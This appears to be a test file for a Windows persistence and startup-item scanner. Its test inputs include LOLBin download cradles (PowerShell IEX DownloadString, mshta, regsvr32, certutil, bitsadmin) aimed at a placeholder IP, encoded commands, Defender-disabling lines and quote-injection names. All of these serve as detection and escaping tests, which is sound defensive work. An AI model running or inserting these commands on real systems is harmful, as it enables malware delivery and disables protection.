// Windows (phase 1), tested on every platform: the PowerShell snapshot is replaced by fixture JSON shaped like what
// windows-snapshot.ps1 prints on a real Windows 11 PC (OneDrive-redirected Documents, Run values, Startup shortcuts,
// vendor tasks and services, the stock SCM WMI subscription). Nothing here runs PowerShell or touches the real home.
import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  commandExe, expandEnv, parseSnapshot, psq, readScript, SNAPSHOT_SCRIPT, stockWmi, winContainment, winLaunchRisk, winLive, windowsItems, type WinSnapshot,
} from "../src/sec/collect/windows";
import { suspiciousLocation } from "../src/sec/collect/system";
import { authenticode } from "../src/sec/intel";
import { evaluate, uncovered } from "../src/sec/rules";
import { COVERS, forBaseline, scan } from "../src/sec/scan";
import type { Ctx } from "../src/sec/ctx";
import type { Finding, Scan } from "../src/sec/types";

const HOME = "C:\\Users\\nok";
const fixture = (): WinSnapshot => JSON.parse(readFileSync(join(import.meta.dir, "fixtures/windows/home-pc.json"), "utf8"));
const tmp = (tag: string) => mkdtempSync(join(tmpdir(), `vs-win-${tag}-`));

// Put together at run time, so antivirus on a Windows checkout does not take this file for a downloader.
const IEX_DL = ["IE", "X (New-Object Net.WebCl", "ient).Downlo", "adString('http://198.51.100.7/a.ps1')"].join("");
const ENC = ["-Enc", "odedCommand"].join("");

/** A scan built from a snapshot, the way scan() would, with profile texts given directly. */
function scanOf(snap: WinSnapshot, profiles: Record<string, string> = {}, at = Date.now()): Scan {
  const r = windowsItems(snap, HOME, (p) => profiles[p]);
  return { version: 1, host: "pc", user: "nok", home: HOME, at, items: [...r.items, ...winLive(snap, HOME)], texts: r.texts, gaps: r.gaps, covers: COVERS };
}
const run = (s: Scan, baseline?: Scan) => evaluate({ scan: s, baseline, malicious: [], secrets: [], sign: async () => ({ kind: "unknown" }) });
const titles = (fs: Finding[]) => fs.map((f) => `${f.severity} ${f.title}`);

describe("windows: snapshot to items", () => {
  test("a real-looking PC: every Run value, Startup entry, task and service is a launch item; nothing on it is flagged", async () => {
    const s = scanOf(fixture());
    const launch = s.items.filter((i) => i.kind === "launch");
    expect(launch.filter((i) => i.id.startsWith("reg:")).length).toBe(8);
    expect(launch.filter((i) => i.id.startsWith("startup:")).length).toBe(3);
    expect(launch.filter((i) => i.id.startsWith("task:")).length).toBe(8);
    expect(launch.filter((i) => i.id.startsWith("svc:")).length).toBe(5);
    const one = launch.find((i) => i.name === "OneDrive")!;
    expect(one.id).toBe("reg:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive");
    expect(one.source).toBe("user");
    expect(one.meta?.what).toBe("HKCU Run value");
    expect(launch.find((i) => i.name === "SunJavaUpdateSched")?.meta?.what).toBe("HKLM Run (32-bit) value");
    expect(launch.find((i) => i.name === "laragon.lnk")?.meta?.program).toBe('"C:\\laragon\\laragon.exe"');
    expect(launch.find((i) => i.id === "task:\\Mozilla\\Firefox Default Browser Agent 308046B0AF4A39CB")?.source).toBe("system-agent");
    expect(launch.find((i) => i.id === "svc:AnyDesk")?.source).toBe("system-daemon");
    // The stock subscription is an item (so a later change to it shows), but never a finding.
    const wmi = s.items.filter((i) => i.kind === "wmi");
    expect(wmi.length).toBe(1);
    expect(stockWmi(wmi[0])).toBe(true);
    expect(titles(await run(s))).toEqual([]);
  });

  test("ids and hashes are stable across scans; a changed command changes the hash, a task switched off does not", () => {
    const a = scanOf(fixture()).items;
    const b = scanOf(fixture()).items;
    expect(b.map((i) => `${i.id}|${i.hash}`)).toEqual(a.map((i) => `${i.id}|${i.hash}`));
    const snap = fixture();
    snap.runKeys![0].command += " --extra";
    snap.tasks![0].state = "Disabled";
    const c = scanOf(snap).items;
    expect(c.find((i) => i.name === "OneDrive")!.hash).not.toBe(a.find((i) => i.name === "OneDrive")!.hash);
    expect(c.find((i) => i.id === a.find((x) => x.id.startsWith("task:"))!.id)!.hash).toBe(a.find((x) => x.id.startsWith("task:"))!.hash);
  });

  test("PowerShell 5.1 shapes: one element as a bare object, null sections, missing fields; errors become gaps", () => {
    const snap: any = {
      runKeys: { hive: "HKCU", key: "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name: "Solo", command: "C:\\Tools\\solo.exe" },
      startup: null, tasks: [{ path: "\\", name: "OneTask", actions: "C:\\Tools\\t.exe /x" }, { path: "\\", name: "Two", actions: { value: ["a.exe", "b.exe /y"], Count: 2 } }],
      services: { value: [null, 7, "x"], Count: 3 },
      wmi: { filters: null, consumers: { name: "Lonely", class: "LogFileEventConsumer" }, bindings: null },
      errors: { services: "Access denied", tasks: "some tasks could not be read: Access is denied." },
    };
    const r = windowsItems(snap, HOME, () => undefined);
    expect(r.items.map((i) => i.id).sort()).toEqual(["LogFileEventConsumer:Lonely", "reg:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Solo", "task:\\OneTask", "task:\\Two"]);
    expect(r.items.find((i) => i.id === "task:\\OneTask")?.meta?.program).toBe("C:\\Tools\\t.exe /x");
    expect(r.items.find((i) => i.id === "task:\\Two")?.meta?.program).toBe("a.exe ; b.exe /y");
    expect(r.gaps["Windows services"]).toBe("Access denied");
    expect(r.gaps["Windows tasks"]).toContain("could not be read");
    // No Documents folder and no reason given: the profiles were not checked, and that is said.
    expect(r.gaps["Windows PowerShell profiles"]).toBeDefined();
    // The whole snapshot failing is one gap, not a clean machine.
    const failed = windowsItems({ errors: { snapshot: "PowerShell did not finish within 30 s" } }, HOME);
    expect(failed.items).toEqual([]);
    expect(Object.keys(failed.gaps)).toEqual(["Windows snapshot"]);
  });

  test("the snapshot is found in PowerShell's output even after a BOM or a warning line; garbage is no snapshot", () => {
    expect(parseSnapshot('\uFEFFWARNING: something\r\n{"v":1,"docs":"C:\\\\Users\\\\nok\\\\OneDrive\\\\Documents"}\r\n')?.docs).toBe("C:\\Users\\nok\\OneDrive\\Documents");
    expect(parseSnapshot("")).toBeUndefined();
    expect(parseSnapshot("{not json")).toBeUndefined();
    expect(parseSnapshot("[1,2]")).toBeUndefined();
    // Non-ASCII arrives as \u escapes (a Thai user name), whatever the console code page.
    expect(parseSnapshot('{"docs":"C:\\\\Users\\\\\\u0e19\\u0e01\\\\Documents"}')?.docs).toBe("C:\\Users\\นก\\Documents");
  });

  test("the snapshot script is plain ASCII and prints every section the parser reads", () => {
    const ps = readFileSync(SNAPSHOT_SCRIPT);
    expect([...ps].every((b) => b < 0x80)).toBe(true);
    const text = ps.toString("latin1");
    for (const k of ["runKeys", "startup", "tasks", "services", "processes", "connections"]) expect(text).toContain(`Section '${k}'`);
    for (const k of ["$out.wmi", "$out.docs", "$out.pshome", "ConvertTo-Json", "MyDocuments", "CommonStartup", "WOW6432Node", "root\\subscription"]) expect(text).toContain(k);
  });
});

describe("windows: where a program runs from", () => {
  test("temp, Public, Recycle Bin, Downloads/Desktop (also in OneDrive), straight in ProgramData and unknown dot-folders are unusual", () => {
    const bad = [
      "C:\\Users\\nok\\AppData\\Local\\Temp\\x.exe", "c:/users/nok/appdata/local/temp/sub/x.exe", "C:\\Windows\\Temp\\svc.exe", "C:\\WINDOWS\\Tasks\\a.exe",
      "C:\\Users\\Public\\Libraries\\svc.exe", "C:\\$Recycle.Bin\\S-1-5-21-1\\x.exe", "C:\\Users\\nok\\Downloads\\setup.exe", "C:\\Users\\nok\\Desktop\\tool.exe",
      "C:\\Users\\nok\\OneDrive\\Desktop\\tool.exe", "C:\\Users\\nok\\OneDrive - Contoso\\Downloads\\x.exe", "C:\\ProgramData\\updater.exe", "C:\\Users\\nok\\.sys\\host.exe",
    ];
    for (const p of bad) expect([p, suspiciousLocation(p, HOME)]).toEqual([p, expect.any(String)]);
    expect(suspiciousLocation("C:\\Users\\nok\\.sys\\host.exe", HOME)).toBe("runs from a hidden folder (~\\.sys)");
    const fine = [
      "C:\\Users\\nok\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", "C:\\Program Files\\Git\\bin\\git.exe", "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
      "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe", "C:\\Users\\nok\\.bun\\bin\\bun.exe", "C:\\Users\\nok\\.vscode\\extensions\\x\\a.exe",
      "C:\\Users\\nok\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", "C:\\Windows\\System32\\svchost.exe", "C:\\laragon\\laragon.exe",
    ];
    for (const p of fine) expect([p, suspiciousLocation(p, HOME)]).toEqual([p, undefined]);
    // Unix paths are judged as before.
    expect(suspiciousLocation("/tmp/x", "/Users/a")).toBeDefined();
    expect(suspiciousLocation("/Users/a/.bun/bin/bun", "/Users/a")).toBeUndefined();
  });

  test("the program in a command line: quotes, unquoted paths with spaces, %VARS%, and what a LOLBin is handed", () => {
    expect(commandExe('"C:\\Program Files\\App\\app.exe" --x', HOME).exe).toBe("C:\\Program Files\\App\\app.exe");
    expect(commandExe("C:\\Program Files (x86)\\Vendor Tools\\tray.exe /min", HOME).exe).toBe("C:\\Program Files (x86)\\Vendor Tools\\tray.exe");
    expect(commandExe("%LOCALAPPDATA%\\Temp\\a.exe", HOME).exe).toBe("C:\\Users\\nok\\AppData\\Local\\Temp\\a.exe");
    expect(commandExe("rundll32.exe C:\\Users\\nok\\AppData\\Roaming\\x\\core.dll,Start", HOME)).toEqual({ exe: "C:\\Users\\nok\\AppData\\Roaming\\x\\core.dll", via: "rundll32" });
    expect(commandExe('wscript.exe //B "C:\\Users\\nok\\AppData\\Roaming\\My App\\run.vbs"', HOME)).toEqual({ exe: "C:\\Users\\nok\\AppData\\Roaming\\My App\\run.vbs", via: "wscript" });
    expect(commandExe('cmd /c start "" "C:\\Users\\Public\\a.exe"', HOME)).toEqual({ exe: "C:\\Users\\Public\\a.exe", via: "cmd" });
    expect(commandExe("%windir%\\system32\\SecurityHealthSystray.exe", HOME).exe).toBe("C:\\Windows\\system32\\SecurityHealthSystray.exe");
    expect(expandEnv("%UNKNOWN%\\x %temp%", HOME)).toBe("%UNKNOWN%\\x C:\\Users\\nok\\AppData\\Local\\Temp");
  });

  test("LOLBins used the way malware uses them are risky; the same tools used plainly are not", () => {
    const risky = [
      `powershell.exe -NoP -W Hidden ${ENC} SQBFAFgA`, "powershell -enc SQBFAFgA", "pwsh -ec SQBFAFgA", "PowerShell.exe -e SQBFAFgA",
      `"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -c "${IEX_DL}"`, "powershell -c \"iwr http://x/a.ps1 | iex\"",
      "cmd /c powershell -nop -c [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SQBFAFgA'))",
      "mshta.exe http://198.51.100.7/a.hta", "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\")",
      "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"", "regsvr32 /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll",
      "certutil -urlcache -split -f http://198.51.100.7/a.exe C:\\Users\\nok\\a.exe", "bitsadmin /transfer j http://198.51.100.7/a.exe C:\\Users\\nok\\a.exe",
      "rundll32.exe C:\\Users\\nok\\AppData\\Roaming\\x\\core.dll,Start", "wscript.exe C:\\Users\\nok\\AppData\\Roaming\\run.vbs",
    ];
    for (const c of risky) expect([c, winLaunchRisk(c, HOME).risky]).toEqual([c, expect.any(String)]);
    expect(winLaunchRisk(`powershell -NoP ${ENC} SQBFAFgA`, HOME).risky).toBe("runs PowerShell with an encoded command");
    const where = winLaunchRisk('"C:\\Users\\nok\\AppData\\Local\\Temp\\wuhelper.exe" /silent', HOME);
    expect(where).toEqual({ where: "runs from a temp folder" });
    expect(winLaunchRisk("rundll32 C:\\Users\\nok\\AppData\\Local\\Temp\\a.dll,Run", HOME).where).toBe("runs from a temp folder (through rundll32)");
    const plain = [
      'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\\Program Files\\VendorTools\\health.ps1"', "powershell -ep bypass -File C:\\Tools\\x.ps1",
      "rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL", "regsvr32 /s C:\\Program Files\\Vendor\\ext.dll", "cmd.exe /c \"C:\\Users\\nok\\AppData\\Roaming\\npm\\npm.cmd\" cache verify",
      "C:\\Users\\nok\\AppData\\Local\\Discord\\Update.exe --processStart Discord.exe",
    ];
    for (const c of plain) expect([c, winLaunchRisk(c, HOME)]).toEqual([c, {}]);
  });
});

describe("windows: rules", () => {
  test("a Run value from Temp, a task with an encoded command and a Startup shortcut to Public are HIGH, with what they are", async () => {
    const snap = fixture();
    snap.runKeys!.push({ hive: "HKCU", key: "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name: "WinUpd", command: '"C:\\Users\\nok\\AppData\\Local\\Temp\\wu.exe" /s' });
    snap.tasks!.push({ path: "\\", name: "SyncCheck", actions: [`powershell.exe -W Hidden ${ENC} SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`] });
    snap.startup!.push({ scope: "user", file: "helper.lnk", path: "C:\\Users\\nok\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.lnk", target: "C:\\Users\\Public\\helper.exe", arguments: "" });
    snap.services!.push({ name: "WinDefendHelper", pathName: "C:\\ProgramData\\svc.exe", startName: "LocalSystem" });
    const f = await run(scanOf(snap));
    expect(titles(f).sort()).toEqual([
      "high HKCU Run value WinUpd starts a program that runs from a temp folder",
      "high Scheduled task \\SyncCheck runs PowerShell with an encoded command",
      "high Service WinDefendHelper starts a program that runs straight from C:\\ProgramData",
      "high Startup folder entry helper.lnk starts a program that runs from C:\\Users\\Public",
    ]);
    // The encoded payload is masked where it is printed.
    expect(f.find((x) => x.title.includes("SyncCheck"))!.detail.join(" ")).not.toContain("SQBFAFgAIAAoAE4AZQB3");
  });

  test("WMI: the stock SCM trio is quiet; command and script consumers are HIGH, other kinds MEDIUM; a tweaked stock one is not stock", async () => {
    const snap = fixture();
    snap.wmi!.filters!.push({ name: "Every60", query: "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" });
    snap.wmi!.consumers!.push(
      { name: "Upd", class: "CommandLineEventConsumer", commandLine: "C:\\Users\\Public\\u.exe" },
      { name: "Scr", class: "ActiveScriptEventConsumer", scriptText: "Set s = CreateObject(\"WScript.Shell\")" },
      { name: "Log", class: "LogFileEventConsumer" },
    );
    snap.wmi!.bindings!.push({ filter: "Every60", consumer: "Upd" }, { filter: "Every60", consumer: "Scr" });
    const f = await run(scanOf(snap));
    expect(titles(f).sort()).toEqual([
      "high WMI subscription runs a command on an event: Upd",
      "high WMI subscription runs a script on an event: Scr",
      "medium WMI subscription that Windows does not ship: Log (LogFileEventConsumer)",
    ]);
    expect(f.find((x) => x.title.endsWith("Upd"))!.detail).toEqual(["C:\\Users\\Public\\u.exe", expect.stringContaining("when: SELECT * FROM __InstanceModificationEvent")]);
    expect(f.find((x) => x.title.endsWith("(LogFileEventConsumer)"))!.detail).toEqual(["not bound to an event filter"]);
    // Same names, other query: someone reused the stock names.
    const fake = fixture();
    fake.wmi!.filters![0].query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'";
    expect(titles(await run(scanOf(fake)))).toEqual(["medium WMI subscription that Windows does not ship: SCM Event Log Consumer (NTEventLogEventConsumer)"]);
  });

  test("against a baseline: new and changed launch items and WMI subscriptions are reported; the clean machine again is not", async () => {
    const base = forBaseline(scanOf(fixture(), {}, 1));
    expect(titles(await run(scanOf(fixture()), base))).toEqual([]);
    const snap = fixture();
    snap.runKeys!.push({ hive: "HKCU", key: "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name: "Notes", command: "C:\\Users\\nok\\AppData\\Local\\Programs\\notes\\notes.exe" });
    snap.services![1].pathName = '"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe" --service --backdoor';
    snap.wmi!.consumers!.push({ name: "Log", class: "LogFileEventConsumer" });
    const t = titles(await run(scanOf(snap), base));
    expect(t).toContain("high New HKCU Run value: Notes");
    expect(t).toContain("medium Changed service: AnyDesk");
    expect(t).toContain("medium New WMI subscription: Log (LogFileEventConsumer)");
  });

  test("a baseline from before WMI was checked does not make the stock subscription or others look new", async () => {
    const base = forBaseline(scanOf({ runKeys: fixture().runKeys }, {}, 1));
    base.covers = COVERS.filter((k) => k !== "wmi");
    const snap = fixture();
    snap.wmi!.consumers!.push({ name: "Log", class: "LogFileEventConsumer" });
    const s = scanOf(snap);
    const t = titles(await run(s, base));
    expect(t.filter((x) => x.includes("New WMI"))).toEqual([]);
    expect(uncovered(s, base)).toContain("Windows WMI subscriptions");
    // Without `covers` at all (a baseline from vswarm 2.3), the same.
    delete base.covers;
    expect(titles(await run(s, base)).filter((x) => x.includes("New WMI"))).toEqual([]);
  });

  test("PowerShell profiles: a downloader line is HIGH, an ordinary one MEDIUM; the redirected Documents folder is the one read", async () => {
    const snap = fixture();
    const prof = "C:\\Users\\nok\\OneDrive\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1";
    const p = (t: string) => ({ [join(snap.docs!, "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1")]: t });
    const before = scanOf(snap, p("Set-Alias ll Get-ChildItem\r\nImport-Module posh-git\r\n"), 1);
    expect(before.items.filter((i) => i.kind === "rc").map((i) => i.id)).toEqual([join(snap.docs!, "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1")]);
    if (process.platform === "win32") expect(before.items.find((i) => i.kind === "rc")!.id).toBe(prof);
    const base = forBaseline(before);
    const lines = [
      IEX_DL, "Start-Process C:\\Tools\\x.exe -WindowStyle Hidden", "Add-MpPreference -ExclusionPath $env:APPDATA", "Set-MpPreference -DisableRealtimeMonitoring $true",
      `powershell ${ENC} SQBFAFgA`, "[Convert]::FromBase64String($b)", "iwr https://example.test/i.ps1 | iex",
    ];
    for (const l of lines) {
      const f = (await run(scanOf(snap, p(`Set-Alias ll Get-ChildItem\r\nImport-Module posh-git\r\n${l}\r\n`)), base)).filter((x) => x.rule === "startup-file");
      expect([l, f.map((x) => x.severity)]).toEqual([l, ["high"]]);
      expect(f[0].title).toMatch(/Microsoft\.PowerShell_profile\.ps1 changed$/);
      expect(f[0].title.startsWith("~/")).toBe(false);
    }
    const calm = (await run(scanOf(snap, p("Set-Alias ll Get-ChildItem\r\nImport-Module posh-git\r\nSet-Location C:\\dev\r\n")), base)).filter((x) => x.rule === "startup-file");
    expect(calm.map((x) => x.severity)).toEqual(["medium"]);
  });

  test("profiles written by PowerShell 5.1 as UTF-16, or appended to as UTF-16, are read as text", () => {
    const d = tmp("ps1");
    const a = join(d, "a.ps1");
    writeFileSync(a, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`Set-Alias ll ls\r\n${IEX_DL}\r\n`, "utf16le")]));
    expect(readScript(a)).toContain("DownloadString");
    const b = join(d, "b.ps1");
    writeFileSync(b, Buffer.concat([Buffer.from("Set-Alias ll ls\r\n"), Buffer.from(`${IEX_DL}\r\n`, "utf16le")]));
    expect(readScript(b)).toContain("DownloadString");
    const c = join(d, "c.ps1");
    writeFileSync(c, "\uFEFFImport-Module posh-git\n");
    expect(readScript(c)).toBe("Import-Module posh-git\n");
    expect(readScript(join(d, "missing.ps1"))).toBeUndefined();
  });

  test("processes and connections: only this session's programs are judged; loopback is left out", async () => {
    const snap = fixture();
    snap.processes!.push(
      { pid: 6660, name: "svc.exe", exe: "C:\\Users\\nok\\AppData\\Local\\Temp\\svc.exe", mine: true },
      { pid: 6661, name: "other.exe", exe: "C:\\Users\\Public\\other.exe", mine: false },
    );
    snap.connections!.push({ pid: 6660, remote: "203.0.113.9", port: 8443 });
    const live = winLive(snap, HOME);
    expect(live.filter((i) => i.kind === "proc").map((i) => i.id)).toEqual(["C:\\Users\\nok\\AppData\\Local\\Temp\\svc.exe"]);
    const conn = live.filter((i) => i.kind === "conn");
    expect(conn.map((i) => i.name).sort()).toEqual(["OneDrive.exe", "msedge.exe", "svc.exe", "svchost.exe"]);
    expect(conn.find((i) => i.name === "msedge.exe")!.meta!.remotes).toBe("142.250.66.110:443 [2404:6800:4001:80e::200e]:443");
    const f = await run(scanOf(snap));
    expect(titles(f).sort()).toEqual([
      "high Program running from an unusual place: C:\\Users\\nok\\AppData\\Local\\Temp\\svc.exe",
      "high svc.exe is connected to other machines and runs from a temp folder",
    ]);
  });

  test("Authenticode answers map to the signature kinds the PATH rule uses", () => {
    expect(authenticode("Valid|CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\r\n", false)).toEqual({ kind: "developer-id", who: "Microsoft Corporation" });
    expect(authenticode('Valid|CN="Contoso, Ltd.", O="Contoso, Ltd.", C=TH', false)).toEqual({ kind: "developer-id", who: "Contoso, Ltd." });
    expect(authenticode("NotSigned|", false)).toEqual({ kind: "unsigned" });
    expect(authenticode("NotSigned|", true)).toEqual({ kind: "script" });
    expect(authenticode("HashMismatch|CN=Contoso", false)).toEqual({ kind: "other", who: "Contoso (HashMismatch)" });
    expect(authenticode("", false)).toEqual({ kind: "unknown" });
  });
});

describe("windows: containment is commands to paste", () => {
  test("PowerShell quoting: single quotes, and all four of PowerShell's single-quote characters doubled", () => {
    expect(psq("plain")).toBe("'plain'");
    expect(psq("it's")).toBe("'it''s'");
    expect(psq("a\u2019b\u2018c")).toBe("'a\u2019\u2019b\u2018\u2018c'");
    expect(psq("$(Remove-Item C:\\x); `whoami`")).toBe("'$(Remove-Item C:\\x); `whoami`'");
  });

  test("Run values, tasks, services, Startup entries and WMI each get the command that stops them", () => {
    const items = scanOf(fixture()).items;
    const q = "C:\\vswarm\\incidents\\1\\quarantine";
    const reg = winContainment(items.find((i) => i.name === "OneDrive")!, q)!;
    expect(reg[0].manual).toBe("Remove-ItemProperty -LiteralPath 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'OneDrive'");
    expect(winContainment(items.find((i) => i.name === "SecurityHealth")!, q)![0].manual).toContain("# from an administrator PowerShell");
    expect(winContainment(items.find((i) => i.id === "task:\\Mozilla\\Firefox Default Browser Agent 308046B0AF4A39CB")!, q)![0].manual)
      .toBe("Disable-ScheduledTask -TaskPath '\\Mozilla\\' -TaskName 'Firefox Default Browser Agent 308046B0AF4A39CB'");
    expect(winContainment(items.find((i) => i.id === "svc:AnyDesk")!, q)![0].manual).toStartWith("Stop-Service -Name 'AnyDesk' -Force; Set-Service -Name 'AnyDesk' -StartupType Disabled");
    expect(winContainment(items.find((i) => i.name === "laragon.lnk")!, q)![0].manual).toContain("Move-Item -LiteralPath 'C:\\Users\\nok\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\laragon.lnk'");
    const evil = windowsItems({ wmi: { consumers: [{ name: "it's", class: "CommandLineEventConsumer; rm" }] } }, HOME).items[0];
    const wmi = winContainment(evil, q)![0].manual;
    expect(wmi).toContain("$_.Consumer.Name -eq 'it''s'");
    // A class name that is not a plain word is not pasted into the command.
    expect(wmi).toContain("-ClassName __EventConsumer |");
    // A name with a quote cannot end the PowerShell string.
    const odd = windowsItems({ runKeys: [{ hive: "HKCU", key: "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name: "x'; Remove-Item C:\\ -Recurse; '", command: "a.exe" }] }, HOME).items[0];
    expect(winContainment(odd, q)![0].manual).toEndWith("-Name 'x''; Remove-Item C:\\ -Recurse; '''");
  });
});

describe("windows: respond and the command line", () => {
  test("respond on a Windows finding: lock, the snapshot as evidence, and PowerShell to paste; nothing is changed", async () => {
    const root = tmp("resp");
    const home = join(root, "home");
    mkdirSync(home, { recursive: true });
    const prev = process.env.VSWARM_SEC_DIR;
    process.env.VSWARM_SEC_DIR = join(root, "sec");
    try {
      const snap = fixture();
      snap.docs = join(home, "Documents");
      snap.runKeys!.push({ hive: "HKCU", key: "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name: "WinUpd", command: '"C:\\Users\\nok\\AppData\\Local\\Temp\\wu.exe" /s' });
      snap.wmi!.consumers!.push({ name: "Upd", class: "CommandLineEventConsumer", commandLine: "C:\\Users\\Public\\u.exe" });
      const ctx: Ctx = { home, pathDirs: [], system: false, host: "pc", user: "nok", run: async () => undefined, win: async () => snap };
      const { check } = await import("../src/sec/engine");
      const { respond } = await import("../src/sec/respond");
      const r = await check(ctx, { offline: true });
      expect(r.verdict).toBe("block");
      const inc = await respond(ctx, r, async () => true);
      const manual = inc.actions.filter((a) => !a.done).map((a) => a.detail ?? "");
      expect(manual.some((d) => d.startsWith("Remove-ItemProperty -LiteralPath 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinUpd'"))).toBe(true);
      expect(manual.some((d) => d.includes("Remove-CimInstance") && d.includes("'Upd'"))).toBe(true);
      expect(inc.evidence.some((e) => e.path === "(windows-snapshot.ps1)" && /^[0-9a-f]{64}$/.test(e.sha256 ?? ""))).toBe(true);
      expect(JSON.parse(readFileSync(join(inc.dir, "evidence", "windows-snapshot.json"), "utf8")).runKeys.length).toBe(snap.runKeys!.length);
    } finally {
      if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
      else process.env.VSWARM_SEC_DIR = prev;
    }
  }, 30_000);

  const CLI = join(import.meta.dir, "../src/cli.ts");
  const vswarm = async (sec: string, ...a: string[]) => {
    const p = Bun.spawn([process.execPath, CLI, ...a], { env: { ...process.env, NO_COLOR: "1", VSWARM_SEC_DIR: sec }, stdin: "ignore", stdout: "pipe", stderr: "pipe" });
    const [out, err, code] = await Promise.all([new Response(p.stdout).text(), new Response(p.stderr).text(), p.exited]);
    return { code, out, err };
  };

  test("preflight --then on every platform (no sh or echo needed): BLOCK stops the command, PASS runs it", async () => {
    const sec = tmp("sec");
    const last = (verdict: string) => writeFileSync(join(sec, "last.json"), JSON.stringify({ verdict, findings: [], at: Date.now(), scan: {} }));
    const say = [process.execPath, "-e", "console.log(process.argv.slice(1).join(' '))", "RAN", "--json"];
    last("block");
    const blocked = await vswarm(sec, "preflight", "--quiet", "--then", ...say);
    expect(blocked.code).toBe(3);
    expect(blocked.out).toBe("");
    last("pass");
    const passed = await vswarm(sec, "preflight", "--quiet", "--then", ...say);
    expect(passed.code).toBe(0);
    expect(passed.out.trim()).toBe("RAN --json");
  }, 60_000);

  test.if(process.platform === "win32")("on Windows, commands of later phases stop with exit 4 and point to WSL", async () => {
    const sec = tmp("sec");
    for (const cmd of [["try", "."], ["ca", "init"], ["cert"], ["canary", "list"], ["shot", "x"], ["agents", "--inspect"]]) {
      const r = await vswarm(sec, ...cmd);
      expect([cmd.join(" "), r.code]).toEqual([cmd.join(" "), 4]);
      expect(r.err).toContain("not on Windows yet");
      expect(r.err).toContain("WSL");
    }
    expect((await vswarm(sec, "version")).code).toBe(0);
  }, 120_000);
});

describe("windows: through scan()", () => {
  test("an injected snapshot is read once per scan: items, profile texts, gaps; baselines keep it, not processes", async () => {
    const home = tmp("home");
    const docs = join(home, "OneDrive", "Documents");
    mkdirSync(join(docs, "PowerShell"), { recursive: true });
    writeFileSync(join(docs, "PowerShell", "profile.ps1"), "oh-my-posh init pwsh | Out-Null\n");
    let calls = 0;
    const snap = { ...fixture(), docs, errors: { tasks: "some tasks could not be read: Access is denied." } };
    let once: Promise<WinSnapshot> | undefined;
    const ctx: Ctx = { home, pathDirs: [], system: true, host: "pc", user: "nok", run: async () => undefined, win: () => (once ??= (calls++, Promise.resolve(snap))) };
    const prev = process.env.VSWARM_SEC_DIR;
    process.env.VSWARM_SEC_DIR = tmp("sec");
    try {
      const s = await scan(ctx);
      expect(calls).toBe(1);
      expect(s.covers).toContain("wmi");
      expect(s.items.some((i) => i.id === "svc:AnyDesk")).toBe(true);
      expect(s.items.some((i) => i.kind === "conn" && i.name === "msedge.exe")).toBe(true);
      expect(Object.keys(s.texts)).toContain(join(docs, "PowerShell", "profile.ps1"));
      expect(s.gaps["Windows tasks"]).toContain("Access is denied");
      const b = forBaseline(s);
      expect(b.items.some((i) => i.kind === "conn" || i.kind === "proc")).toBe(false);
      expect(b.items.some((i) => i.kind === "wmi")).toBe(true);
    } finally {
      if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
      else process.env.VSWARM_SEC_DIR = prev;
    }
  });

  test("without a snapshot (macOS, Linux) the Windows part adds nothing", async () => {
    const home = tmp("home");
    const s = await scan({ home, pathDirs: [], system: false, host: "t", user: "t", run: async () => undefined }, { live: false });
    expect(s.items.filter((i) => i.kind === "wmi" || i.id.startsWith("reg:"))).toEqual([]);
    expect(Object.keys(s.gaps).filter((k) => k.startsWith("Windows"))).toEqual([]);
  });
});

describe("windows: background watch as a scheduled task", () => {
  const { winTaskAction, winTaskXml } = require("../src/sec/schedule");
  const { ownWatchTask } = require("../src/sec/collect/windows");
  const { recordManagedFile } = require("../src/sec/store");
  const launcher = "C:\\Users\\a & b\\.vswarm\\bin\\vswarm.cmd";

  test("the task runs the launcher headless every n minutes, with XML characters escaped", () => {
    const xml = winTaskXml(launcher, 15);
    expect(xml).toContain("<Interval>PT15M</Interval>");
    expect(xml).toContain("<Command>conhost.exe</Command>");
    expect(xml).toContain("<Arguments>--headless &quot;C:\\Users\\a &amp; b\\.vswarm\\bin\\vswarm.cmd&quot; watch run</Arguments>");
    expect(xml).toContain("<LogonType>InteractiveToken</LogonType>");
    expect(xml).not.toContain("HighestAvailable");
    expect(() => winTaskAction('C:\\x"y\\vswarm.cmd')).toThrow("double quote");
  });

  test("the scan skips vswarm's own task only while its action is exactly what vswarm registered", () => {
